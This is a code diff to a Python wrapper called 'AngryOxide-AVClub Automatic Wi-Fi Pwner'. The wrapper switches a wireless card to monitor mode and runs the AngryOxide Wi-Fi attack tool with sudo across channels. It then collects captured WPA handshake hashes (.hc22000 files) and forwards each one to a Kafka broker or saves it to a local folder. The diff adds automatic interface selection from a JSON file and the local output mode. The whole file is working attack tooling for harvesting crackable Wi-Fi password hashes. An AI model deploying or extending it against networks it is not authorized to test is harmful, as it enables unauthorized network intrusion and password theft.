@@ -22,13 +22,13 @@ DESC_MESSAGE = \
 + r"||     _    ___               ___     ______  ||"  + "\n"\
 + r"||    / \  / _ \             / \ \   / / ___| ||"  + "\n"\
 + r"||   / _ \| | | |  _____    / _ \ \ / / |     ||"  + " by dr0pp1n\n"\
-+ r"||  / ___ \ |_| | |_____|  / ___ \ V /| |___  ||"  + " Version 0.6a\n"\
-+ r"|| /_/   \_\___/          /_/   \_\_/  \____| ||"  + " Build 251201\n"\
++ r"||  / ___ \ |_| | |_____|  / ___ \ V /| |___  ||"  + " Version 0.7a\n"\
++ r"|| /_/   \_\___/          /_/   \_\_/  \____| ||"  + " Build 260817\n"\
 + r"||                                            ||"  + "\n"\
 + r">>============================================<<"  + "\n"
 
 WELCOME_MESSAGE = DESC_MESSAGE \
-+ "[*] AngryOxide-AVClub Automatic Wi-Fi Hashdumper starting up...\n"\
++ "[*] AngryOxide-AVClub Automatic Wi-Fi Pwner starting up...\n"\
 + "[!] Select an interface to convert to monitor mode.\n"\
 + "[!] Send SIGINT (Ctrl-C) to exit.\n"
 
@@ -46,14 +46,32 @@ Examples:
   python3 AVC.py
   python3 AVC.py -b 192.168.1.100:9092
   python3 AVC.py --interval 10
-  python3 AVC.py -b 192.168.1.100:9092 -i 10
+  python3 AVC.py -a config.json
+  python3 AVC.py -a config.json -b 192.168.1.100:9092
+  python3 AVC.py -lo
+  python3 AVC.py -b 192.168.1.100:9092 -lo
   python3 AVC.py -h
         '''
     )
-    parser.add_argument('-b', '--broker', type=str, default=KAFKA_BROKER, 
-                        help=f'Kafka broker address (ip:port), default: {KAFKA_BROKER}')
-    parser.add_argument('-i', '--interval', type=int, default=MODULE_INTERVAL,
-                        help=f'Scan interval in seconds, default: {MODULE_INTERVAL}')
+
+    # Interface Selection
+    interface_group = parser.add_argument_group('Interface Selection')
+    interface_group.add_argument('-a', '--auto', type=str, default=None, nargs='?', const='interfaces.json',
+                                 metavar='CONFIG.JSON',
+                                 help='Auto-select wireless interface from JSON config file (default: interfaces.json)')
+
+    # Output Configuration
+    output_group = parser.add_argument_group('Output Configuration')
+    output_group.add_argument('-b', '--broker', type=str, default=None, metavar='BROKER',
+                              help='Kafka broker address (ip:port), e.g., 192.168.1.100:9092')
+    output_group.add_argument('-lo', '--local', action='store_true', dest='local',
+                              help='Save hashes to local "hashes" folder (default if neither -lo nor -b specified)')
+
+    # Scan Configuration
+    scan_group = parser.add_argument_group('Scan Configuration')
+    scan_group.add_argument('-i', '--interval', type=int, default=MODULE_INTERVAL, metavar='SECONDS',
+                            help=f'Scan interval in seconds (default: {MODULE_INTERVAL})')
+
     return parser.parse_args()
 
 def list_wireless_interfaces():
@@ -76,11 +94,11 @@ def select_interface():
     if not interfaces:
         print("[!] No wireless interfaces found.")
         sys.exit(1)
-    
+
     print("\n[*] Available wireless interfaces:")
     for i, iface in enumerate(interfaces, 1):
         print(f"  {i}. {iface}")
-    
+
     while True:
         try:
             choice = int(input("\n[*] Select interface (number): "))
@@ -90,6 +108,43 @@ def select_interface():
                 print("[!] Invalid selection. Try again.")
         except ValueError:
             print("[!] Invalid input. Enter a number.")
+
+def load_interfaces_from_json(json_file):
+    """Load wireless interfaces from a JSON configuration file."""
+    try:
+        with open(json_file, 'r') as f:
+            data = json.load(f)
+        if isinstance(data, dict) and 'interfaces' in data:
+            return data['interfaces']
+        elif isinstance(data, list):
+            return data
+        else:
+            print("[!] Invalid JSON format. Expected list or dict with 'interfaces' key.")
+            return []
+    except Exception as e:
+        print(f"[!] Error loading JSON file: {e}")
+        return []
+
+def auto_select_interface(json_file):
+    """Auto-select an interface from JSON file if available on the system."""
+    configured_interfaces = load_interfaces_from_json(json_file)
+    if not configured_interfaces:
+        print("[!] No interfaces found in JSON file.")
+        sys.exit(1)
+
+    available_interfaces = list_wireless_interfaces()
+    if not available_interfaces:
+        print("[!] No wireless interfaces found on system.")
+        sys.exit(1)
+
+    for iface in configured_interfaces:
+        if iface in available_interfaces:
+            print(f"[+] Auto-selected interface: {iface}")
+            return iface
+
+    print("[!] No configured interfaces found on this system.")
+    print(f"[!] Available interfaces: {', '.join(available_interfaces)}")
+    sys.exit(1)
 
 def enable_monitor_mode(interface):
     """Enable monitor mode on the selected interface."""
@@ -193,24 +248,43 @@ def publish_to_kafka(topic, message, broker='localhost:9092'):
 # ======================
 # Main Function
 # ======================
-def main(interval, broker):
+def main(interval, broker, use_local, use_kafka, auto_config):
     print("[*] Cleaning up...")
     subprocess.run(["./cleanup.sh"])
 
-    # Select and enable monitor mode
-    selected_interface = select_interface()
+    # Select interface (auto or manual)
+    if auto_config:
+        selected_interface = auto_select_interface(auto_config)
+    else:
+        selected_interface = select_interface()
+
     if not enable_monitor_mode(selected_interface):
         print("[!] Failed to enable monitor mode. Exiting.")
         sys.exit(1)
 
+    # Create hashes folder if using local output
+    hash_dir = '.'
+    if use_local:
+        os.makedirs('hashes', exist_ok=True)
+        hash_dir = 'hashes'
+        print("[+] Created/using 'hashes' folder for local output")
+
     print("[*] Starting attack modules...")
     # Start AngryOxide subprocess
     print(f"[*] Starting AngryOxide on {selected_interface}...")
-    angryoxide = subprocess.Popen(['sudo', 'angryoxide', '-i', selected_interface, '-c', '1,2,3,4,5,6,7,8,10,11,12,13', '-w', 'whitelist.txt', '-r', '3', '--headless', '--notar'],
+    angryoxide_cmd = ['sudo', 'angryoxide', '-i', selected_interface, '-c', '1,2,3,4,5,6,7,8,10,11,12,13', '-w', 'whitelist.txt', '-r', '3', '--headless', '--notar']
+    if use_local:
+        angryoxide_cmd.extend(['-o', hash_dir])
+    angryoxide = subprocess.Popen(angryoxide_cmd,
                                   stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     print(f"[*] Started AngryOxide with PID {angryoxide.pid}")
     print(f"[*] Scan interval: {interval} seconds")
-    print(f"[*] Kafka broker: {broker}")
+    if use_local:
+        print(f"[*] Output mode: Local files in '{hash_dir}' folder")
+    if use_kafka:
+        print(f"[*] Kafka broker: {broker}")
+    if use_local and use_kafka:
+        print("[*] Hash files will be saved locally AND published to Kafka")
 
     processed_files = set()
 
@@ -218,10 +292,10 @@ def main(interval, broker):
     while True:
         try:
             time.sleep(interval)
-            
-            # Find all .hc22000 files in current directory
-            hc_files = [f for f in os.listdir('.') if f.endswith('.hc22000')]
-            
+
+            # Find all .hc22000 files in configured directory
+            hc_files = [f for f in os.listdir(hash_dir) if f.endswith('.hc22000')]
+
             for hc_file in hc_files:
                 if hc_file not in processed_files:
                     print(f"[*] Found new hash file: {hc_file}")
@@ -238,8 +312,9 @@ def main(interval, broker):
                         else:
                             essid = name_without_ext
                             bssid = 'unknown'
-                        
-                        with open(hc_file, 'r') as f:
+
+                        file_path = os.path.join(hash_dir, hc_file)
+                        with open(file_path, 'r') as f:
                             for line in f:
                                 line = line.strip()
                                 if line:
@@ -251,7 +326,8 @@ def main(interval, broker):
                                         'hash': line
                                     }
                                     print(f"[+] Read hash from {essid} ({bssid}): {line}")
-                                    publish_to_kafka('wifi-hash', message, broker=broker)
+                                    if use_kafka:
+                                        publish_to_kafka('wifi-hash', message, broker=broker)
                         processed_files.add(hc_file)
                     except Exception as e:
                         print(f"[!] Error reading {hc_file}: {e}")
@@ -273,7 +349,23 @@ if __name__ == "__main__":
     try:
         args = parse_arguments()
         print(WELCOME_MESSAGE)
-        main(interval=args.interval, broker=args.broker)
+
+        # Determine output modes (default to local if neither specified)
+        use_kafka = args.broker is not None
+        use_local = args.local or (args.broker is None)
+
+        # Set broker to default if Kafka is enabled but no broker specified
+        broker = args.broker if use_kafka else None
+
+        # Display output mode
+        if use_local and use_kafka:
+            print("[*] Output mode: Local + Kafka")
+        elif use_kafka:
+            print("[*] Output mode: Kafka")
+        else:
+            print("[*] Output mode: Local (default)")
+
+        main(interval=args.interval, broker=broker, use_local=use_local, use_kafka=use_kafka, auto_config=args.auto)
     except KeyboardInterrupt:
         print("\n[!] SIGINT detected (Ctrl-C), exiting...")
         sys.exit(0)
